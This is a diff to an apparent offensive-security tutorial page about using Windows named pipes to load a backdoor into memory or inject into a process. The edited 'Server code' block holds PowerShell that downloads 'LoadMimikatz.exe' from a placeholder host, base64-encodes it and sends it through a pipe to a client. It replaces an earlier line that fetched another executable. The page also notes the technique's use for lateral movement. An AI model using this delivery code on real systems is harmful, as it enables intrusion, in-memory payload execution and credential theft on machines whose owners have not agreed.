@@ -59,7 +59,7 @@
             <section class="article">
                 <div class="d-flex flex-column flex-md-row justify-content-between mb-5">
                     <div class="flex-grow-1">
-                        <h4 class="mb-0">Definition</h4>
+                         
                             <p>
                                 Named pipes are a Windows feature used for interprocess communication (IPC). It can be used to load the backdoor into memory or inject into a process. Named pipes are used for local processes to communicate with each other. It’s similar to a TCP session between a client and server. It can be used to provide communication channel between processes on the same computer or between processes on different computers across a network. ( => Might be interesting for lateral movement) <br>
                                 Source : <a href="https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes">https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes</a>
@@ -236,8 +236,7 @@
 
                                 <i style="color: red;">Server code :</i>
                                 <div class="squarebox">
-                                    $assemblyFile = (New-Object Net.WebClient).DownloadString("https://X.X.X.X/YahudScript.exe") <br>
-                                    $assemblyByte = [System.IO.File]::ReadAllBytes($assemblyFile) <br>
+                                    $assemblyByte = (Invoke-WebRequest "http://X.X.X.X/LoadMimikatz.exe").Content <br>
                                     $assemblyB64 = [System.Convert]::ToBase64String($assemblyByte) <br>
                                     $sw.WriteLine($assemblyB64) # Server sending to the client <br>
                                 </div>
